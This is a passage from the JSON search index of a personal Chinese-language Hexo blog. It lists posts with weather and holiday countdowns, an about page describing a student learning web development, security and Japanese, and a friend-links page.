温度:30°C(26~32°C) 风级:微风&lt;3级 空气质量:18 优 节日 端午节: 1天 父亲节: 7天 夏至日: 8天 建党节、香港回归日: 18天","tags":"每日播报"},{"title":"我的第一篇文章","url":"/posts/2054644849/","text":"我是24k,你好啊 距离中考仅剩 13 天 海口市天气 雷阵雨 温度:28°C(27~31°C) 风级:东南风3~4级 空气质量:14 优 节日 端午节: 2天 父亲节: 8天 夏至日: 9天 建党节、香港回归日: 19天 以上 2021.06.12","tags":"初见"},{"title":"关于博客","url":"/about.html","text":"关于我 自我介绍 这里是24k，又名Jobs 编程菜鸟一只 🇨🇳 来自中国 ⌨️ WEB 学习中 ∞ ⌨️ 运维与安全 学习中 ⌨️ Java 学习中 ⌨️ 重庆邮电大学-本科在读 ⌨️ 日本語を勉強します。 建这个博客的原因 觉得hexo好玩,就建了。 接下来想用博客做什么 发表各种杂七杂八的文章,包括但不限于:计算机技术、语言学习、日常唠嗑、奇怪的东西。 建站日期:2021.06.12","tags":""},{"title":"文章归档","url":"/archives.html","text":"","tags":""},{"title":"搜索","url":"/search/index.html","text":"","tags":""},{"title":"我的朋友","url":"/PY.html","text":"欢迎互加友链 好友们 (我不是孤儿啦!) 添加方式 添加可以在评论区留言,请使用以下格式方便懒狗复制: - [![网站名](头像链接)](网站地址 &quot;网站名&quot;)","tags":""}]}